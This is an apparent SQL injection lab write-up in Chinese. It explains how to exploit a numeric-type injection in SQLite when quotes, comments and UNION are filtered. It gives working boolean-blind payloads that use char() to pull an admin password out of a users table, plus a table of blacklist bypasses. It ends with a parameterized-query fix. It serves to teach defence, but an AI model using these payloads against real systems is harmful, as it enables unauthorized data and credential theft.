# 过滤掉引号之后的注入

## 这一题在教什么

**黑名单拦的是「符号」，而 payload 的写法有很多种。**

过滤器拦了三类东西：

```
单引号、双引号
注释（--、#、/*）
union
```

于是冒出两个"看起来很合理"的结论 —— **两个都是错的**：

| 结论 | 为什么错 |
|---|---|
| 「引号被拦了，注入打不了」 | 这一题是**数字型**注入，压根不需要引号。而真要写字符串字面量的时候，还有不用引号的写法 |
| 「UNION 被拦了，读不出数据」 | UNION 只是**一种**信道 |

两件事合起来，就把"**怎么在不能写引号的情况下拼出字符串**"变成了必答题。

## 漏洞在哪

`module.py`：

```python
sql = "SELECT id, sku, qty FROM stock WHERE sku_id = %s" % sku_id
```

注意那个 `sku_id` 两边**没有引号** —— 这是个**数字型**位置。

## 怎么打通

### 第一步：看清两件事

```
1' OR 1=1 --        被「单引号」拦掉
```

但看页面上的执行语句：

```sql
SELECT id, sku, qty FROM stock WHERE sku_id = 1
```

**那个 `1` 两边没有引号。** 所以闭合引号这一步根本不需要。

### 第二步：`union` 被拦了，换信道

这个接口正好有真假两种状态（查到就显示表格，查不到就显示「没有」）：

```
1 OR 1=1
```

所有行都出来了（基线：查一个不存在的编号是空表）。

### 第三步（关键）：不用引号写字符串字面量

要判断"密码的第一位是不是某个字符"，就得把那个字符写成字符串。
而单引号被拦了。**怎么办？**

**`char()` —— 它接受一串数字，返回对应的字符串。**

```sql
char(97)                     -- 'a'
char(97,100,109,105,110)     -- 'admin'
```

整个 payload 一个引号都没有：

```sql
1 OR (SELECT substr(password,1,1) FROM users
        WHERE username=char(97,100,109,105,110))=char(116)
```

把 `substr` 的位置从 1 数到 6、把 `char(N)` 里的 N 换一遍，密码就出来了。

### 第四步：提速

跟 `sqli/boolean_blind` 同一套：二分（`>` 代替 `=`）、`hex()` 压字符集、
先用 `length()` 问出长度。

## 不用引号的几种写法（这一节值得背）

| 写法 | 要引号吗 | 在 SQLite 上能用吗 |
|---|---|---|
| `'admin'` | 要 | 被拦了 |
| `char(97,100,109,105,110)` | **不要** | **能用** |
| `X'61646d696e'` | 要（`X'...'` 里有引号） | 被拦了 |
| `CAST(X'61646d696e' AS TEXT)` | 要（同上） | 被拦了 |
| `0x61646d696e` | 不要 | **不能当字符串用** |

最后一行是个很容易踩的坑：

> SQLite 里 `0x61646d696e` 是**整数** `1633771876`，不是字符串 `'admin'`。
> 它是把你写的十六进制数转成数值，不是转成字节串。
>
> （在 MySQL 里 `0x61646d696e` 当字符串用是有效的 —— 所以从别的数据库
> 搬 payload 过来会在这里栽。）

所以引号被拦之后，**`char()` 是这里唯一顺手的路子**。

## 为什么"黑名单"在这一层注定失败

| 你拦的 | 攻击者换成 |
|---|---|
| 单引号 | `char(97,100,...)` |
| 双引号 | 同上（SQLite 里双引号是标识符引用，本来也用不上） |
| `union` | 布尔信道、`ORDER BY`（见 `sqli/order_by_injection`）、时间信道 |
| 注释 | 不用注释（尾部的 `%'` 用语法闭合掉，或者数字型根本没有尾部） |
| 空格 | `/**/`、制表符、换行（见 `sqli/keyword_filter`） |

**枚举"不该出现的符号"是无底洞；而"这个位置是值还是语法"是一个确定的问题。**
后者才是要判断的东西。

## 怎么修

**参数化，跟前几道一样：**

```python
con.execute("SELECT id, sku, qty FROM stock WHERE sku_id = ?", (sku_id,))
```

但这一题额外要记住一句话：

> **「这个位置是什么类型」不该影响你怎么防。**
>
> 数字型不用引号 —— 这件事经常被当成"所以这里更安全"。
> 恰恰相反：**引号转义只能防字符型，而参数化两种情况都防。**

如果出于某种原因必须拼（比如标识符位置），那就只能白名单：

```python
ALLOWED = {"sku_id", "sku", "qty"}
if field not in ALLOWED:
    abort(400)
```

**"拦住几个字符"永远不是白名单 —— 它是黑名单，而黑名单在这件事上必然失败。**
